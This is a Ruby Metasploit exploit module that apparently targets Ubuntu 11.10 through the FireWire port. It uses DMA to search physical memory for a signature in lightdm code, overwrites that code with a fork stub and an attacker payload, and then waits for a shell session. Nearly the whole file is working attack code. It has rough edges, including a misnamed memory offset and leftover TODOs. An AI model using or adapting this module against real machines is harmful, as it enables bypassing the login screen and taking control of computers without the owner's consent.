##
require 'msf/core'
require '~/.msf4/external/forensic1394/bus.rb'

class Metasploit3 < Msf::Exploit::Local
    # Rank = ExcellentRanking

	def initialize(info = {})
		super(update_info(info,
            # TODO: fix before deployment
			'Name'           => 'farm <= 11.10 Firewire DMA attack to overwrite lightdm code',
			'Description'    => %q{
                Firewire lightdm attack.
          	},
			'Author'         => [ 'albert', 'rory' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 0.11 $',
			'References'     =>
				[
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 296,
                    'Encoder'     => 'generic/none'
				},
			'Platform'       => 'linux',
			'Arch'           => ARCH_X86,
			'Targets'	=>
				[
					[ 'Ubuntu 11.10', { 'Offset' => 0x540, 'Signature' => "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24\x70\x73\x05\x08\xe8\x3e\x53\xff\xff\x83\xc4\x24\x31\xc0\x5b\x5e", 'Space' => 75 } ],
					# [ 'Ubuntu 11.10', { 'Offset' => 0x4f2, 'Signature' => "8B430C8B501C895424048B40", 'Space' => 75 } ],
				],
			'DefaultTarget'	=> 0,
        	'DisclosureDate' => 'Long long ago', 
        ))
        register_options(
			[
			], self.class)

		register_advanced_options(
			[
			], self.class)
	end

	def exploit
        forkpatch = "\x50\xb8\x02\x00\x00\x00\xcd\x80\x85\xc0\x74\x02\x58\xc3"
        prologue= "\x90\x90\x89\x5c\x24\x04\xc7\x04\x24\x70\x73\x05\x08\xe8\x3e\x53\xff\xff\x83\xc4\x24\x31\xc0\x5b\x5e"
        # sig = hex2bin(target['Signature'])
        sig = target['Signature']
        # nops = nop_generator.generate_sled(target['Space'] - payload.encoded.length) 
        patch = prologue + forkpatch + payload.encoded
        off = target['Offset'] 

        # Print phase, method and patch parameters
        puts '        Using signature: %s' % bin2hex(sig)
        puts '        Using patch:     %s' % bin2hex(patch)
        puts '        Using offset:    %x' % off

        # Initialize
        b = Bus.new
        d = initialize_fw(b, d)
         
        # Find memory size
        memsize = 4 * 1024 * 1024  * 1024
        
        # Attack
        puts 'Starting attack...'
        begin        
        # Find
            addr = findsig(d, sig, off, memsize)
            if !addr
                success = false
            else
                success = true
                puts 'Signature found at 0x%x.' % addr
                d.write(addr, patch)
                if (d.read(addr, patch.length) == patch)
                    puts 'Patch confirmed'
                end
            end 
        rescue IOError => e
            success = false
            puts 'I/O Error, make sure FireWire interfaces are properly connected.'
            puts e.message
        end

        if !success
            fail('Signature not found.')
        end

		print_status "Starting the payload handler..."
		while(true)
			break if session_created?
			select(nil,nil,nil,1)
		end

        b.delete
 	end

    def check

    end
    
    def initialize_fw(b, d)
        # Enable SBP-2 support to ensure we get DMA
        b.enable_sbp2()

        begin
            for i in 3.downto(1)
                puts "[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C \r" % i; 
                STDOUT.flush
                sleep(1)
            end
        rescue 
            puts 'Interrupted'
        end 

        # Open the first device
        d = b.devices
       
        if (d.length > 0)
            d = d[0]
            d.open()
            puts ''
        else
            raise 'nothing connected'
        end

        return d
    end 

    def findsig(d, sig, off, memsize)
        pagesize = 4096 
        # Skip the first 1 MiB of memory
        one_mb = 3 * 1024 * 1024 * 1024
        
        for addr in (one_mb + off..memsize).step(pagesize)
            data = d.read(addr, sig.length)
            # print "Data found %s at %d \r" % [data.unpack('C*').map{ |b| "%02X" % b }.join(), addr]
            # TODO: Fix ugly compare, should be direct compare of bin data and sig 
            # puts "----"
            # pp data
            # pp sig 
            if (data  == sig)
                return addr
            end
        end
    end          
    def fail(msg)
        puts "\n [!] Attack unsuccessful."
        puts msg
        exit
    end


    def hex2bin(s)
        raise "Not a valid hex string" unless(s =~ /^[\da-fA-F]+$/)
        s = '0' + s if((s.length & 1) != 0)
        return s.scan(/../).map{ |b| b.to_i(16) }.pack('C*')
    end

    def bin2hex(s)
        return s.unpack('C*').map{ |b| "%02X" % b }.join('')
    end
end
